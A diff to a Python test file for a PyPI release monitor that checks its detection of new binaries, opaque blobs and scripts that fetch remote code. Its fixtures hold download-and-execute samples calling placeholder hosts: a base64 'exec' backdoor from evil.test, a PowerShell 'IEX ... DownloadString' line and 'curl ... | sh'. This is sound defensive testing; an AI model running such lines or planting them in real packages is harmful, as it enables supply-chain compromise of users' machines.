@@ -1,10 +1,12 @@
+import random
+from collections.abc import Mapping
 from pathlib import Path
 
 from pypi_monitor.analyzers.base import ReleaseContext, Signal
 from pypi_monitor.analyzers.diff import DiffAnalyzer
 from pypi_monitor.domain import Severity
 
-Files = dict[str, str]
+Files = Mapping[str, str | bytes]
 BACKDOOR = (
     "import base64, urllib.request\n"
     'exec(base64.b64decode(urllib.request.urlopen("https://evil.test/p").read()))\n'
@@ -18,7 +20,10 @@ def write(directory: Path, version: str, files: Files, wheel: Files | None) -> N
     ):
         for path, text in content.items():
             (root / path).parent.mkdir(parents=True, exist_ok=True)
-            (root / path).write_text(text)
+            if isinstance(text, bytes):
+                (root / path).write_bytes(text)
+            else:
+                (root / path).write_text(text)
 
 
 def diff(
@@ -221,3 +226,83 @@ def test_wheel_after_sdists_only_is_still_compared(tmp_path: Path) -> None:
 
 def test_change_of_format_alone_says_nothing_about_known_code(tmp_path: Path) -> None:
     assert rules(diff(tmp_path, BASE, {}, ({}, BASE))) == set()
+
+
+ELF = b"\x7fELF" + bytes(2000)
+NOISE = random.Random(1).randbytes(8192)  # noqa: S311
+
+
+def test_a_binary_swapped_in_a_pure_artifact(tmp_path: Path) -> None:
+    signals = diff(tmp_path, {**BASE, "a/lib.so": ELF}, {**BASE, "a/lib.so": ELF + b"x"})
+    assert rules(signals) == {"diff.file.binary_changed"}
+
+
+def test_an_executable_is_a_binary_whatever_its_name(tmp_path: Path) -> None:
+    assert rules(diff(tmp_path, BASE, {**BASE, "a/data/helper": ELF})) == {"diff.file.new_binary"}
+
+
+def test_platform_wheels_report_rebuilt_binaries_once(tmp_path: Path) -> None:
+    for version, payload in (("1.0", ELF), ("1.1", ELF + b"x")):
+        wheel = tmp_path / version / f"a-{version}-cp313-cp313-manylinux_x86_64.whl"
+        (wheel / "a").mkdir(parents=True)
+        (wheel / "a/__init__.py").write_text("X = 1\n")
+        for name in ("one.so", "two.so"):
+            (wheel / "a" / name).write_bytes(payload)
+    (wheel / "a/three.so").write_bytes(ELF)
+    signals = DiffAnalyzer().analyze(
+        ReleaseContext(
+            name="a",
+            version="1.1",
+            artifact_dir=tmp_path / "1.1",
+            previous_artifact_dir=tmp_path / "1.0",
+        )
+    )
+
+    by_rule = {signal.rule_id: signal for signal in signals}
+    assert set(by_rule) == {"diff.file.platform_binaries_changed", "diff.file.new_platform_binary"}
+    assert "2 binaries changed" in by_rule["diff.file.platform_binaries_changed"].evidence
+
+
+def test_new_scripts_and_what_they_do(tmp_path: Path) -> None:
+    new = {
+        **BASE,
+        "a/build.sh": "#!/bin/sh\nmake\n",
+        "a/run.ps1": "$x = 1\nIEX (New-Object Net.WebClient).DownloadString('http://e.test')\n",
+        "a/bin/tool": "#!/usr/bin/env bash\necho hi\n",
+    }
+
+    signals = diff(tmp_path, BASE, new)
+
+    by_path = {
+        signal.file_path.rsplit("/", 1)[-1]: signal for signal in signals if signal.file_path
+    }
+    assert by_path["build.sh"].rule_id == "diff.file.new_script"
+    assert by_path["tool"].rule_id == "diff.file.new_script"
+    assert by_path["run.ps1"].rule_id == "diff.file.new_script_fetches"
+    assert by_path["run.ps1"].line == 2
+
+
+def test_opaque_blobs_but_not_known_formats(tmp_path: Path) -> None:
+    new: Files = {
+        **BASE,
+        "a/payload": NOISE,
+        "a/logo.png": NOISE,
+        "a/key.txt": "QUJD" * 1000,
+        "a/real.png": b"\x89PNG" + NOISE,
+        "a/model.onnx": NOISE,
+        "a/readme.txt": "plain words " * 500,
+    }
+
+    signals = diff(tmp_path, BASE, new)
+
+    blobs = {Path(s.file_path or "").name for s in signals if s.rule_id == "diff.file.new_blob"}
+    assert blobs == {"payload", "logo.png", "key.txt"}
+
+
+def test_files_outside_the_installed_package_are_noise(tmp_path: Path) -> None:
+    wheel = {"a/core.py": "X = 1\n"}
+    new = {**BASE, "ci/deploy.sh": "#!/bin/sh\ncurl http://e.test | sh\n"}
+
+    signals = diff(tmp_path, BASE, new, (wheel, wheel))
+
+    assert rules(signals) == {"noise.diff.file.new_script_fetches"}
